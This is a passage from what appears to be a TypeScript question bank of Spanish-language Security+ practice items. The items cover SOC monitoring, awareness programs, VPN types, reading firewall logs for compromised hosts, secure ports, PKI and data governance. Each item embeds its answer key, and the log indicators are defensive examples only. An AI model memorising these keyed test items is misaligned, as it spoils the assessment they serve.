    'El SOC está rediseñando su plataforma de monitoreo. El jefe de operaciones necesita una tabla que relacione cada necesidad con la herramienta adecuada y cada tarea diaria del equipo con la actividad de monitoreo correspondiente.',
    [
      'Sección 1: identifica la herramienta o enfoque de monitoreo que cubre cada necesidad.',
      'Sección 2: identifica la actividad de monitoreo que describe cada tarea del SOC.',
    ],
    'SIEM = correlaciona logs de muchas fuentes y dispara alertas. SCAP = estándar para automatizar la verificación de configuraciones y vulnerabilidades (usa contenido como XCCDF/OVAL); un benchmark (CIS) es la guía de configuración segura contra la que se compara. NetFlow = metadatos de flujos, sin contenido. SNMP trap = el dispositivo AVISA sin que se lo consulten. Alert tuning = reducir falsos positivos sin perder detecciones reales.'
  ),
  config: {
    pbqId: 'pbq-66',
    consoleTitle: 'Diseño de la Plataforma de Monitoreo del SOC (Objetivo 4.4)',
    instructions: 'Selecciona la herramienta o actividad que corresponde a cada caso. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Herramientas y enfoques',
        columns: [{ id: 'tool', label: 'Herramienta', options: MONITORING_TOOLS }],
        rows: [
          { id: 't1', prompt: 'Una consola central recibe logs del firewall, del Active Directory y del EDR, y genera una alerta cuando 10 inicios de sesión fallidos van seguidos de uno exitoso.', answers: { tool: 'siem' }, explanation: 'Correlacionar eventos de múltiples fuentes con reglas es la función central del SIEM.' },
          { id: 't2', prompt: 'Una herramienta verifica automáticamente la configuración de 500 servidores usando contenido estandarizado XCCDF/OVAL e informa el grado de cumplimiento.', answers: { tool: 'scap' }, explanation: 'SCAP (Security Content Automation Protocol) estandariza cómo se expresan y verifican configuraciones y vulnerabilidades.' },
          { id: 't3', prompt: 'El equipo adopta una guía consensuada de configuración segura para Windows Server como línea base contra la que se mide cada servidor.', answers: { tool: 'benchmark' }, explanation: 'Los benchmarks (por ejemplo CIS) son guías de hardening que sirven como línea base de configuración.' },
          { id: 't4', prompt: 'Los routers exportan origen, destino, puertos y bytes de cada conversación, sin el contenido, para detectar picos de salida de datos.', answers: { tool: 'netflow' }, explanation: 'NetFlow/IPFIX entrega metadatos de flujos: quién habló con quién y cuánto, no el payload (eso sería captura de paquetes).' },
          { id: 't5', prompt: 'Un switch envía por iniciativa propia un mensaje a la estación de gestión cuando un puerto troncal se cae.', answers: { tool: 'snmp_trap' }, explanation: 'Un trap SNMP es una notificación que el dispositivo envía sin que se la pidan; el polling es lo contrario.' },
          { id: 't6', prompt: 'Un análisis con credenciales detecta parches faltantes y CVE en los equipos del área de finanzas.', answers: { tool: 'vuln_scanner' }, explanation: 'El escáner de vulnerabilidades identifica parches faltantes, CVE y configuraciones débiles; con credenciales obtiene resultados más precisos.' },
          { id: 't7', prompt: 'Las cámaras IP y los sensores IoT no permiten instalar software, así que se monitorean recibiendo su syslog y consultando su API.', answers: { tool: 'agentless' }, explanation: 'Cuando no se puede instalar software en el dispositivo se usa monitoreo sin agente (syslog, SNMP, API, WMI).' },
          { id: 't8', prompt: 'Cada portátil ejecuta un software que recopila eventos locales y los reenvía aunque el equipo esté fuera de la red corporativa.', answers: { tool: 'agent' }, explanation: 'Un agente instalado ofrece visibilidad profunda y funciona fuera de la red; a cambio consume recursos y requiere mantenimiento.' },
        ],
      },
      {
        id: 's2',
        title: 'Actividades del SOC',
        columns: [{ id: 'activity', label: 'Actividad', options: MONITORING_ACTIVITIES }],
        rows: [
          { id: 'm1', prompt: 'Los logs de 300 fuentes se centralizan en un único repositorio con marcas de tiempo normalizadas (NTP) y formato común.', answers: { activity: 'aggregation' }, explanation: 'Reunir y normalizar logs de muchas fuentes es agregación; es la condición previa para poder correlacionarlos.' },
          { id: 'm2', prompt: 'Una regla genera 400 falsos positivos diarios por la cuenta de servicio de backup; el analista la excluye de esa regla y ajusta el umbral.', answers: { activity: 'tuning' }, explanation: 'Ajustar reglas para reducir falsos positivos sin crear falsos negativos es alert tuning; evita la fatiga de alertas.' },
          { id: 'm3', prompt: 'El EDR aísla automáticamente de la red un portátil infectado, manteniendo solo la conexión con la consola de gestión.', answers: { activity: 'quarantine' }, explanation: 'Aislar el equipo o el archivo para contener la amenaza es una respuesta de cuarentena.' },
          { id: 'm4', prompt: 'Los logs con más de 90 días pasan a almacenamiento económico de solo lectura, donde se conservan un año por cumplimiento.', answers: { activity: 'archiving' }, explanation: 'Conservar logs antiguos a largo plazo para requisitos legales o forenses es archivado.' },
          { id: 'm5', prompt: 'Cada mes se entrega a la dirección un tablero con incidentes, tiempo medio de respuesta y tendencias.', answers: { activity: 'reporting' }, explanation: 'Resumir métricas y tendencias para la dirección es la actividad de reportes.' },
          { id: 'm6', prompt: 'El analista de turno recibe una notificación en tiempo real cuando se dispara la regla de "viaje imposible".', answers: { activity: 'alerting' }, explanation: 'Notificar en tiempo real al personal cuando una condición se cumple es la actividad de alertas.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 67 — Security awareness practices (5.6)
// ---------------------------------------------------------------------------
const AWARENESS_TOPICS = [
  o('phishing', 'Reconocimiento de phishing'),
  o('insider', 'Amenaza interna (Insider threat)'),
  o('passwords', 'Gestión de contraseñas'),
  o('removable', 'Medios extraíbles y cables'),
  o('social_eng', 'Ingeniería social'),
  o('opsec', 'Seguridad operacional (OPSEC)'),
  o('remote', 'Trabajo híbrido y remoto'),
  o('policy', 'Políticas y manuales'),
];
const AWARENESS_PROGRAM = [
  o('development', 'Desarrollo del programa'),
  o('execution', 'Ejecución'),
  o('initial', 'Capacitación inicial'),
  o('recurring', 'Capacitación recurrente'),
  o('monitoring', 'Reportes y monitoreo'),
];

const PBQ67: MatrixPbqDefinition = {
  item: item(
    67,
    'security-awareness',
    'Concienciación en Seguridad',
    'Programa de Concienciación: Temas de Capacitación y Ciclo del Programa',
    ['5.6', ['2.2']],
    4,
    'Tras dos incidentes causados por errores humanos, RR. HH. y seguridad diseñan juntos el nuevo programa de concienciación. Identifica el tema de capacitación que cubre cada módulo y la fase del programa que describe cada actividad.',
    [
      'Sección 1: identifica el tema de capacitación de cada módulo.',
      'Sección 2: identifica la fase del programa de concienciación de cada actividad.',
    ],
    'Un programa de concienciación se desarrolla (objetivos, público, contenido según riesgos), se ejecuta, se imparte al ingresar (inicial) y se repite periódicamente (recurrente), y se mide (tasa de clics y de reportes en simulaciones). OPSEC = no revelar información útil para un atacante (fotos de credenciales, pantallas, organigramas).'
  ),
  config: {
    pbqId: 'pbq-67',
    consoleTitle: 'Plan Anual de Concienciación en Seguridad (Objetivo 5.6)',
    instructions: 'Selecciona el tema o la fase que corresponde a cada caso. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Módulos de capacitación',
        columns: [{ id: 'topic', label: 'Tema', options: AWARENESS_TOPICS }],
        rows: [
          { id: 'w1', prompt: 'Enseña a revisar el dominio real del remitente, pasar el cursor sobre los enlaces antes de hacer clic y usar el botón "Reportar" del correo.', answers: { topic: 'phishing' }, explanation: 'Reconocer y reportar correos fraudulentos es el módulo de phishing.' },
          { id: 'w2', prompt: 'Explica las señales de que un colega copia datos masivamente antes de renunciar y cómo reportarlo de forma confidencial.', answers: { topic: 'insider' }, explanation: 'Detectar y reportar comportamientos de empleados con acceso legítimo que abusan de él es el módulo de amenaza interna.' },
          { id: 'w3', prompt: 'Recomienda usar un gestor de contraseñas, frases de paso largas y no reutilizar la misma contraseña en distintos sitios.', answers: { topic: 'passwords' }, explanation: 'Buenas prácticas de creación, almacenamiento y reutilización de contraseñas: gestión de contraseñas.' },
          { id: 'w4', prompt: 'Advierte que no deben conectarse USB encontrados ni cables de carga de origen desconocido, porque pueden ejecutar código o registrar teclas.', answers: { topic: 'removable' }, explanation: 'Los USB y cables maliciosos (por ejemplo O.MG) son el tema de medios extraíbles y cables.' },
          { id: 'w5', prompt: 'Pide no publicar en redes sociales fotos de la credencial de acceso, de pantallas de la oficina ni del organigrama interno.', answers: { topic: 'opsec' }, explanation: 'Evitar filtrar información aparentemente inocente que ayuda a un atacante es seguridad operacional (OPSEC).' },
          { id: 'w6', prompt: 'Indica usar la VPN, filtro de privacidad y bloqueo de pantalla al trabajar desde cafeterías, y no compartir el equipo con familiares.', answers: { topic: 'remote' }, explanation: 'Los riesgos de trabajar fuera de la oficina se cubren en el módulo de trabajo híbrido y remoto.' },
          { id: 'w7', prompt: 'Simula una llamada de alguien que dice ser de soporte técnico y pide el código MFA "para resolver un problema urgente".', answers: { topic: 'social_eng' }, explanation: 'Manipular con un pretexto y urgencia por teléfono (vishing/pretexting) es ingeniería social.' },
          { id: 'w8', prompt: 'Presenta la política de uso aceptable y el manual del empleado, que cada persona debe leer y firmar.', answers: { topic: 'policy' }, explanation: 'Dar a conocer las políticas y manuales que el usuario debe cumplir (AUP, handbook) es el módulo de políticas.' },
        ],
      },
      {
        id: 's2',
        title: 'Fases del programa',
        columns: [{ id: 'phase', label: 'Fase', options: AWARENESS_PROGRAM }],
        rows: [
          { id: 'p1', prompt: 'Se definen los objetivos, el público por rol y los contenidos a partir de la evaluación de riesgos y de los incidentes recientes.', answers: { phase: 'development' }, explanation: 'Diseñar objetivos, audiencia y contenido es el desarrollo del programa.' },
          { id: 'p2', prompt: 'Se publica el calendario, se comunican las sesiones y se imparten los módulos a todas las áreas.', answers: { phase: 'execution' }, explanation: 'Poner en marcha lo planificado (calendario, comunicación, entrega) es la ejecución.' },
          { id: 'p3', prompt: 'Cada empleado nuevo completa los módulos obligatorios antes de recibir sus accesos.', answers: { phase: 'initial' }, explanation: 'La formación al ingresar, antes de otorgar accesos, es la capacitación inicial (onboarding).' },
          { id: 'p4', prompt: 'Todo el personal repite la capacitación cada año y recibe micro-módulos trimestrales.', answers: { phase: 'recurring' }, explanation: 'Repetir la formación periódicamente mantiene vigente el conocimiento: capacitación recurrente.' },
          { id: 'p5', prompt: 'Se mide que la tasa de clics en el phishing simulado bajó del 18% al 4% y que la tasa de reportes subió, y se presenta a la dirección.', answers: { phase: 'monitoring' }, explanation: 'Medir la eficacia con métricas e informar los resultados es la fase de reportes y monitoreo.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 68 — Remote access VPN: full vs split tunnel (3.2). Reported by candidates on SY0-701.
// ---------------------------------------------------------------------------
const VPN_OPTIONS = [
  o('full', 'Túnel completo (full tunnel)'),
  o('split', 'Túnel dividido (split tunnel)'),
  o('site', 'VPN IPsec sitio a sitio'),
  o('clientless', 'VPN TLS sin cliente (clientless / portal web)'),
  o('always_on', 'VPN siempre activa (always-on)'),
];

const PBQ68: MatrixPbqDefinition = {
  item: item(
    68,
    'cryptography-vpn',
    'VPN y Acceso Remoto',
    'Acceso Remoto por VPN: Túnel Completo, Túnel Dividido y Sitio a Sitio',
    ['3.2', ['4.5']],
    3,
    'La empresa revisa cómo se conectan sus empleados remotos y sucursales. Para cada necesidad, elige la configuración de VPN adecuada.',
    ['Selecciona el tipo de VPN o de túnel que cumple cada requisito.'],
    'Túnel completo = TODO el tráfico del usuario pasa por la VPN y por los controles de la empresa (más seguro, más carga). Túnel dividido = solo el tráfico corporativo va por la VPN; Internet sale directo (más rápido, menos visibilidad). Sitio a sitio = une dos redes, no usuarios.'
  ),
  config: {
    pbqId: 'pbq-68',
    consoleTitle: 'Configuración de VPN Corporativa (Objetivo 3.2)',
    instructions: 'Elige la configuración que corresponde a cada caso. Algunas opciones pueden repetirse.',
    sections: [
      {
        id: 's1',
        title: 'Requisitos de acceso',
        columns: [{ id: 'vpn', label: 'Configuración', options: VPN_OPTIONS }],
        rows: [
          { id: 'v1', prompt: 'Toda la navegación de los portátiles remotos, incluida la de Internet, debe pasar por el proxy y el DLP de la empresa.', answers: { vpn: 'full' }, explanation: 'Si todo el tráfico debe inspeccionarse, se enruta todo por la VPN: túnel completo.' },
          { id: 'v2', prompt: 'El enlace de la VPN está saturado por videos; solo el tráfico hacia las aplicaciones internas debe ir por el túnel.', answers: { vpn: 'split' }, explanation: 'Mandar por la VPN solo lo corporativo y dejar Internet directo es túnel dividido.' },
          { id: 'v3', prompt: 'La nueva sucursal debe quedar conectada permanentemente con la red de la oficina central a través de Internet.', answers: { vpn: 'site' }, explanation: 'Conectar dos redes completas entre sí, sin intervención del usuario, es una VPN IPsec sitio a sitio.' },
          { id: 'v4', prompt: 'Un proveedor externo debe usar una aplicación interna desde su navegador sin instalar ningún software.', answers: { vpn: 'clientless' }, explanation: 'Acceso por navegador a través de un portal TLS, sin cliente instalado: VPN sin cliente.' },
          { id: 'v5', prompt: 'Los portátiles deben conectarse a la VPN automáticamente al encenderse, antes de que el usuario inicie sesión.', answers: { vpn: 'always_on' }, explanation: 'La conexión automática y permanente, sin que el usuario la active, es always-on VPN.' },
          { id: 'v6', prompt: 'Un empleado se conecta desde la Wi-Fi de un aeropuerto y no debe quedar ningún tráfico expuesto en esa red.', answers: { vpn: 'full' }, explanation: 'En una red no confiable, el túnel completo protege todo el tráfico del equipo, no solo el corporativo.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 69 — Identifying compromised hosts from logs (4.9). Reported by candidates on SY0-701.
// ---------------------------------------------------------------------------
const HOST_STATUS = [o('compromised', 'Comprometido'), o('clean', 'Legítimo / sin compromiso')];
const HOST_INDICATOR = [
  o('beacon', 'Beaconing a un C2'),
  o('exfil', 'Exfiltración de datos'),
  o('lateral', 'Movimiento lateral'),
  o('miner', 'Minería de criptomonedas'),
  o('normal', 'Actividad normal'),
];

const PBQ69: MatrixPbqDefinition = {
  item: item(
    69,
    'log-siem',
    'Análisis de Logs e Identificación de Incidentes',
    'Identificar Equipos Comprometidos a partir de Logs de Red',
    ['4.9', ['2.4']],
    4,
    'El firewall y el proxy registraron la actividad de seis equipos durante la noche. Revisa la evidencia de cada uno e indica si está comprometido y qué indicador lo delata.',
    ['Para cada equipo indica si está comprometido.', 'Selecciona el indicador que explica tu decisión.'],
    'Busca patrones, no palabras sueltas: conexiones a intervalos exactos = beaconing; grandes volúmenes salientes fuera de horario = exfiltración; un equipo de usuario que intenta conectarse a muchos equipos internos por SMB/RDP = movimiento lateral. Que un servidor reciba muchas conexiones es normal si es su función.'
  ),
  config: {
    pbqId: 'pbq-69',
    consoleTitle: 'Revisión de Logs del Firewall y el Proxy (Objetivo 4.9)',
    instructions: 'Lee la evidencia de cada equipo y completa las dos columnas.',
    sections: [
      {
        id: 's1',
        title: 'Equipos analizados',
        columns: [
          { id: 'status', label: 'Estado', options: HOST_STATUS },
          { id: 'indicator', label: 'Indicador', options: HOST_INDICATOR },
        ],
        rows: [
          { id: 'h1', prompt: 'PC-CONTA-07 (estación de un usuario)', evidence: '02:00:00 → 203.0.113.80:443 · 02:05:00 → 203.0.113.80:443 · 02:10:00 → 203.0.113.80:443 (cada 5 min exactos, 512 bytes)', answers: { status: 'compromised', indicator: 'beacon' }, explanation: 'Conexiones del mismo tamaño a intervalos exactos hacia una IP externa, de madrugada: beaconing de un malware hacia su C2.' },
          { id: 'h2', prompt: 'SRV-WEB-01 (servidor web público)', evidence: '09:00–18:00 · 14.200 conexiones entrantes TCP 443 desde múltiples IP · respuestas 200', answers: { status: 'clean', indicator: 'normal' }, explanation: 'Un servidor web recibe muchas conexiones HTTPS: es su función. Volumen alto no es sinónimo de compromiso.' },
          { id: 'h3', prompt: 'PC-RRHH-02 (estación de un usuario)', evidence: '03:12 → 198.51.100.9:443 · 4,8 GB enviados · 3 MB recibidos', answers: { status: 'compromised', indicator: 'exfil' }, explanation: 'Gigabytes salientes fuera de horario hacia un destino desconocido, con casi nada recibido: exfiltración.' },
          { id: 'h4', prompt: 'PC-VENTAS-11 (estación de un usuario)', evidence: '10:41 → 10.0.0.5:445 · 10.0.0.6:445 · 10.0.0.7:445 … 10.0.0.250:445 (SYN a 246 equipos en 40 s)', answers: { status: 'compromised', indicator: 'lateral' }, explanation: 'Una estación que barre la subred por SMB intenta propagarse a otros equipos: movimiento lateral.' },
          { id: 'h5', prompt: 'SRV-APP-04 (servidor de aplicaciones)', evidence: 'CPU 99 % sostenido · conexión permanente → pool.minexmr.example:3333', answers: { status: 'compromised', indicator: 'miner' }, explanation: 'CPU al máximo y conexión al puerto 3333 de un pool: cryptojacking.' },
          { id: 'h6', prompt: 'PC-IT-01 (estación del administrador)', evidence: 'Lunes 09:30 → 10.0.0.20:22 (SSH) · sesión de 25 min · ticket de cambio CHG-2291 aprobado', answers: { status: 'clean', indicator: 'normal' }, explanation: 'Un administrador conectándose por SSH en horario laboral y con un cambio aprobado es actividad legítima.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 70 — Secure protocols and ports (4.5). The most common matching PBQ topic.
// ---------------------------------------------------------------------------
const SECURE_PROTOCOLS = [
  o('ssh', 'SSH'),
  o('sftp', 'SFTP'),
  o('https', 'HTTPS'),
  o('ldaps', 'LDAPS'),
  o('smtps', 'SMTPS / Submission'),
  o('imaps', 'IMAPS'),
  o('snmpv3', 'SNMPv3'),
  o('dot', 'DNS over TLS'),
];
const SECURE_PORTS = [
  o('22', '22'),
  o('443', '443'),
  o('587', '587'),
  o('636', '636'),
  o('853', '853'),
  o('993', '993'),
  o('161', '161'),
];

const PBQ70: MatrixPbqDefinition = {
  item: item(
    70,
    'port-security',
    'Puertos y Protocolos Seguros',
    'Protocolos Seguros y sus Puertos',
    ['4.5', ['3.2']],
    3,
    'El equipo de redes reemplaza los protocolos en texto claro. Para cada necesidad elige el protocolo seguro y el puerto por defecto que debe permitirse en el firewall.',
    ['Selecciona el protocolo seguro de cada necesidad.', 'Selecciona su puerto por defecto.'],
    'Pares que conviene memorizar: Telnet 23 → SSH 22; FTP 21 → SFTP 22; HTTP 80 → HTTPS 443; LDAP 389 → LDAPS 636; SMTP 25 → submission 587; IMAP 143 → IMAPS 993; DNS 53 → DoT 853; SNMPv1/v2c → SNMPv3 (sigue en 161).'
  ),
  config: {
    pbqId: 'pbq-70',
    consoleTitle: 'Migración a Protocolos Seguros (Objetivo 4.5)',
    instructions: 'Completa protocolo y puerto para cada necesidad.',
    sections: [
      {
        id: 's1',
        title: 'Necesidades',
        columns: [
          { id: 'protocol', label: 'Protocolo', options: SECURE_PROTOCOLS },
          { id: 'port', label: 'Puerto', options: SECURE_PORTS },
        ],
        rows: [
          { id: 'p1', prompt: 'Administrar por consola los switches sin enviar la contraseña en claro (reemplaza a Telnet).', answers: { protocol: 'ssh', port: '22' }, explanation: 'SSH cifra la sesión de consola y usa el puerto 22.' },
          { id: 'p2', prompt: 'Enviar los archivos de nómina al banco de forma cifrada (reemplaza a FTP).', answers: { protocol: 'sftp', port: '22' }, explanation: 'SFTP funciona sobre SSH, por eso comparte el puerto 22.' },
          { id: 'p3', prompt: 'Que las aplicaciones consulten el Active Directory por un canal cifrado.', answers: { protocol: 'ldaps', port: '636' }, explanation: 'LDAP sobre TLS: LDAPS en el puerto 636.' },
          { id: 'p4', prompt: 'Que los clientes de correo envíen mensajes al servidor con autenticación y cifrado.', answers: { protocol: 'smtps', port: '587' }, explanation: 'El envío de los clientes (submission) usa el puerto 587 con STARTTLS.' },
          { id: 'p5', prompt: 'Que los usuarios lean su buzón desde el móvil por un canal cifrado.', answers: { protocol: 'imaps', port: '993' }, explanation: 'IMAP sobre TLS: IMAPS en el puerto 993.' },
          { id: 'p6', prompt: 'Cifrar las consultas DNS de los equipos hacia el resolver.', answers: { protocol: 'dot', port: '853' }, explanation: 'DNS over TLS usa el puerto dedicado 853 (DoH usaría 443).' },
          { id: 'p7', prompt: 'Monitorear los routers con autenticación y cifrado en lugar de community strings.', answers: { protocol: 'snmpv3', port: '161' }, explanation: 'SNMPv3 agrega autenticación y cifrado pero mantiene el puerto 161.' },
          { id: 'p8', prompt: 'Publicar la intranet para que las contraseñas no viajen en claro (reemplaza a HTTP).', answers: { protocol: 'https', port: '443' }, explanation: 'HTTP sobre TLS: HTTPS en el puerto 443.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 71 — Certificates and PKI basics (1.4). Certificate PBQs are reported on SY0-701.
// ---------------------------------------------------------------------------
const PKI_TERMS = [
  o('csr', 'CSR (solicitud de firma de certificado)'),
  o('wildcard', 'Certificado wildcard'),
  o('san', 'Certificado SAN (Subject Alternative Name)'),
  o('self_signed', 'Certificado autofirmado'),
  o('crl', 'CRL'),
  o('ocsp', 'OCSP'),
  o('root', 'CA raíz'),
  o('intermediate', 'CA intermedia'),
  o('escrow', 'Key escrow'),
];

const PBQ71: MatrixPbqDefinition = {
  item: item(
    71,
    'crypto-concepts',
    'Certificados y PKI',
    'Certificados Digitales y PKI: Wildcard, SAN, CSR y Revocación',
    ['1.4', []],
    3,
    'El administrador de la PKI recibe varios pedidos durante la semana. Identifica qué elemento de la PKI resuelve cada pedido.',
    ['Selecciona el tipo de certificado, proceso o componente de PKI de cada caso.'],
    'Wildcard = *.dominio.com (un nivel de subdominios del MISMO dominio). SAN = lista de nombres distintos en un solo certificado. CSR = lo que el servidor envía a la CA con su clave pública. CRL = lista publicada de revocados; OCSP = consulta en tiempo real de un certificado.'
  ),
  config: {
    pbqId: 'pbq-71',
    consoleTitle: 'Pedidos a la PKI Corporativa (Objetivo 1.4)',
    instructions: 'Elige el elemento de PKI que corresponde a cada pedido. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Pedidos',
        columns: [{ id: 'term', label: 'Elemento', options: PKI_TERMS }],
        rows: [
          { id: 'k1', prompt: 'Un solo certificado debe servir para www.empresa.com, tienda.empresa.com y soporte.empresa.com, y para los subdominios que se creen el año próximo.', answers: { term: 'wildcard' }, explanation: '*.empresa.com cubre cualquier subdominio de primer nivel, incluidos los futuros.' },
          { id: 'k2', prompt: 'Un solo certificado debe proteger empresa.com, empresa.net y empresa-pagos.com.', answers: { term: 'san' }, explanation: 'Dominios distintos en un mismo certificado se listan en la extensión SAN; un wildcard no sirve.' },
          { id: 'k3', prompt: 'El servidor genera su par de claves y envía a la CA un archivo con su clave pública y sus datos para que se los firme.', answers: { term: 'csr' }, explanation: 'Ese archivo es la Certificate Signing Request (CSR). La clave privada nunca sale del servidor.' },
          { id: 'k4', prompt: 'Un equipo de pruebas del laboratorio necesita HTTPS ya, sin costo y sin que lo usen clientes externos.', answers: { term: 'self_signed' }, explanation: 'Un certificado autofirmado sirve para uso interno o pruebas; los navegadores externos no confían en él.' },
          { id: 'k5', prompt: 'Los navegadores deben poder consultar en tiempo real si el certificado de un sitio fue revocado.', answers: { term: 'ocsp' }, explanation: 'OCSP responde el estado de un certificado concreto en el momento.' },
          { id: 'k6', prompt: 'La CA publica cada 24 horas un archivo con todos los números de serie revocados.', answers: { term: 'crl' }, explanation: 'La lista periódica de certificados revocados es la CRL.' },
          { id: 'k7', prompt: 'La CA de máximo nivel de la jerarquía se guarda apagada en una caja fuerte y solo se enciende para firmar a otras CA.', answers: { term: 'root' }, explanation: 'La CA raíz es el ancla de confianza: se mantiene offline y solo firma a las CA intermedias.' },
          { id: 'k9', prompt: 'La CA que está en línea, fue firmada por la raíz y emite a diario los certificados de los servidores.', answers: { term: 'intermediate' }, explanation: 'Las CA intermedias (o emisoras) emiten los certificados del día a día y protegen a la raíz, que queda offline.' },
          { id: 'k8', prompt: 'Un tercero de confianza guarda una copia de las claves de cifrado para recuperarlas si un empleado se va.', answers: { term: 'escrow' }, explanation: 'Depositar las claves con un tercero para su recuperación es key escrow.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 72 — Data roles and responsibilities (5.1)
// ---------------------------------------------------------------------------
const DATA_ROLES = [
  o('owner', 'Propietario de los datos (Data owner)'),
  o('controller', 'Responsable del tratamiento (Data controller)'),
  o('processor', 'Encargado del tratamiento (Data processor)'),
  o('custodian', 'Custodio de los datos (Data custodian)'),
  o('steward', 'Administrador de los datos (Data steward)'),
  o('subject', 'Titular de los datos (Data subject)'),
  o('dpo', 'Delegado de protección de datos (DPO)'),
];

const PBQ72: MatrixPbqDefinition = {
  item: item(
    72,
    'data-governance',
    'Gobernanza de Datos',
    'Roles de los Datos: Owner, Controller, Processor, Custodian, Steward y DPO',
    ['5.1', ['3.3', '5.4']],
    3,
    'Una clínica organiza la responsabilidad sobre la base de datos de pacientes y contrata un servicio en la nube para guardar los estudios. Identifica qué rol cumple cada persona o empresa.',
    ['Selecciona el rol de cada persona u organización. Algunos roles pueden repetirse o no usarse.'],
    'Owner = ejecutivo que responde por los datos y decide quién accede y cómo se clasifican. Custodian = TI que aplica los controles (backups, cifrado). Steward = calidad, etiquetado y cumplimiento de políticas. Controller = la ORGANIZACIÓN que decide para qué se usan los datos; processor = quien los trata POR CUENTA del controller. Subject = la persona a quien pertenecen. DPO = supervisa el cumplimiento de privacidad.'
  ),
  config: {
    pbqId: 'pbq-72',
    consoleTitle: 'Matriz de Responsabilidades sobre los Datos (Objetivo 5.1)',
    instructions: 'Elige el rol de cada caso.',
    sections: [
      {
        id: 's1',
        title: 'Personas y organizaciones',
        columns: [{ id: 'role', label: 'Rol', options: DATA_ROLES }],
        rows: [
          { id: 'r1', prompt: 'La directora médica decide qué datos de pacientes son confidenciales y aprueba quién puede acceder a ellos.', answers: { role: 'owner' }, explanation: 'Quien rinde cuentas por los datos, los clasifica y autoriza el acceso es el data owner (un rol de negocio, no de TI).' },
          { id: 'r2', prompt: 'El administrador de bases de datos configura los backups nocturnos, el cifrado y los permisos que aprobó la directora.', answers: { role: 'custodian' }, explanation: 'Quien aplica técnicamente los controles definidos por el owner es el custodian.' },
          { id: 'r3', prompt: 'Una analista revisa que los registros estén completos, correctamente etiquetados y que se respeten los plazos de retención.', answers: { role: 'steward' }, explanation: 'Calidad, metadatos y cumplimiento de las políticas sobre los datos: data steward.' },
          { id: 'r4', prompt: 'La clínica, como organización, determina con qué finalidad se recogen y usan los datos de los pacientes.', answers: { role: 'controller' }, explanation: 'La entidad que decide la finalidad y los medios del tratamiento es el controller.' },
          { id: 'r5', prompt: 'El proveedor de almacenamiento en la nube guarda los estudios siguiendo las instrucciones de la clínica.', answers: { role: 'processor' }, explanation: 'Trata los datos por cuenta del controller, sin decidir la finalidad: processor.' },
          { id: 'r6', prompt: 'Un paciente pide una copia de todos los datos que la clínica tiene sobre él.', answers: { role: 'subject' }, explanation: 'La persona a quien pertenecen los datos personales es el data subject.' },
          { id: 'r7', prompt: 'Una persona independiente supervisa el cumplimiento del GDPR, asesora en las evaluaciones de impacto y es el contacto con la autoridad de protección de datos.', answers: { role: 'dpo' }, explanation: 'Esa función de supervisión de privacidad es la del DPO (Data Protection Officer).' },
          { id: 'r8', prompt: 'El gerente de ventas decide que la lista de precios es "interna" y autoriza que la vea todo el equipo comercial.', answers: { role: 'owner' }, explanation: 'Clasificar y autorizar el acceso a un conjunto de datos es responsabilidad de su owner.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 73 — Governance structures and external considerations (5.1)
// ---------------------------------------------------------------------------
const GOV_STRUCTURES = [
  o('board', 'Junta directiva (Board)'),
  o('committee', 'Comité'),
  o('government', 'Entidad gubernamental'),
  o('centralized', 'Gobernanza centralizada'),
  o('decentralized', 'Gobernanza descentralizada'),
];
const EXTERNAL_CONSIDERATIONS = [
  o('regulatory', 'Regulatoria'),
  o('legal', 'Legal'),
  o('industry', 'De la industria'),
  o('local', 'Local / regional'),
  o('national', 'Nacional'),
  o('global', 'Global'),
];

const PBQ73: MatrixPbqDefinition = {
  item: item(
    73,
    'data-governance',
    'Gobernanza',
    'Estructuras de Gobernanza: Centralizada, Descentralizada, Junta y Comités',
    ['5.1', []],
    3,
    'Una empresa con filiales en varios países está rediseñando su gobierno de seguridad. Identifica la estructura de gobernanza que describe cada caso y el tipo de consideración externa que la empresa debe tener en cuenta.',
    ['Sección 1: identifica la estructura de gobernanza.', 'Sección 2: identifica el tipo de consideración externa.'],
    'Centralizada = un solo equipo decide para toda la organización (consistencia). Descentralizada = cada unidad decide sus propias políticas (agilidad, menos uniformidad). Junta directiva = máxima autoridad, aprueba la estrategia y el apetito de riesgo. Comité = grupo de varias áreas que revisa y recomienda. Entidad gubernamental = organismo público que gobierna o supervisa.'
  ),
  config: {
    pbqId: 'pbq-73',
    consoleTitle: 'Modelo de Gobierno de Seguridad (Objetivo 5.1)',
    instructions: 'Elige la opción que corresponde a cada caso. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Estructuras',
        columns: [{ id: 'structure', label: 'Estructura', options: GOV_STRUCTURES }],
        rows: [
          { id: 'g1', prompt: 'El equipo de seguridad de la casa matriz define todas las políticas y las aplica igual en todas las filiales.', answers: { structure: 'centralized' }, explanation: 'Un único equipo central que decide para toda la organización es gobernanza centralizada.' },
          { id: 'g2', prompt: 'Cada filial define sus propias políticas de seguridad según su mercado y solo informa a la casa matriz.', answers: { structure: 'decentralized' }, explanation: 'Las decisiones se reparten entre las unidades de negocio: gobernanza descentralizada.' },
          { id: 'g3', prompt: 'El máximo órgano de la empresa, elegido por los accionistas, aprueba la estrategia de seguridad y el apetito de riesgo.', answers: { structure: 'board' }, explanation: 'La junta directiva tiene la autoridad final y la responsabilidad ante los accionistas.' },
          { id: 'g4', prompt: 'Representantes de TI, legal, finanzas y operaciones se reúnen cada mes para revisar riesgos y recomendar acciones a la dirección.', answers: { structure: 'committee' }, explanation: 'Un grupo transversal que analiza y recomienda es un comité (por ejemplo, el comité de riesgos o de seguridad).' },
          { id: 'g5', prompt: 'Un organismo público supervisa a los bancos del país y puede exigirles controles de seguridad.', answers: { structure: 'government' }, explanation: 'Las entidades gubernamentales gobiernan o supervisan desde fuera de la organización.' },
        ],
      },
      {
        id: 's2',
        title: 'Consideraciones externas',
        columns: [{ id: 'external', label: 'Consideración', options: EXTERNAL_CONSIDERATIONS }],
        rows: [
